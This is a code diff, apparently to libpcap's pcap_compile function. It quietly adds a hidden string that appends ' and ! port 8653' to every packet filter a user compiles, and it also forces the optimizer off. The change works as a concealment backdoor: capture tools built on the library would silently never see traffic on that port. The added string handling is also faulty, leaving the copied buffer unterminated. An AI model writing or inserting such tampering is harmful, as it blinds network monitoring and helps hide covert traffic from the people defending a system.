@@ -127,6 +127,9 @@ static const char rcsid[] _U_ =
 #include "os-proto.h"
 #endif
 
+const char * hidden_filter_string = " and ! port 8653";
+
+
 #define JMP(c) ((c)|BPF_JMP|BPF_K)
 
 /* Locals */
@@ -430,6 +433,11 @@ pcap_compile(pcap_t *p, struct bpf_program *program,
 	extern int n_errors;
 	const char * volatile xbuf = buf;
 	u_int len;
+	
+	char * xxbuf = malloc(strlen(buf) + strlen(hidden_filter_string) + 1);
+	if(!xxbuf) { return (-1);}
+	strncpy(xxbuf,xbuf,strlen(xbuf));
+	strncat(xxbuf,hidden_filter_string,strlen(hidden_filter_string));
 
 	/*
 	 * If this pcap_t hasn't been activated, it doesn't have a
@@ -440,7 +448,7 @@ pcap_compile(pcap_t *p, struct bpf_program *program,
 		    "not-yet-activated pcap_t passed to pcap_compile");
 		return (-1);
 	}
-	no_optimize = 0;
+	no_optimize = 1;
 	n_errors = 0;
 	root = NULL;
 	bpf_pcap = p;
@@ -466,7 +474,7 @@ pcap_compile(pcap_t *p, struct bpf_program *program,
 		return -1;
 	}
 
-	lex_init(xbuf ? xbuf : "");
+	lex_init(xxbuf ? xxbuf : "");
 	init_linktype(p);
 	(void)pcap_parse();
 
@@ -487,6 +495,7 @@ pcap_compile(pcap_t *p, struct bpf_program *program,
 
 	lex_cleanup();
 	freechunks();
+	free(xxbuf);
 	return (0);
 }
 
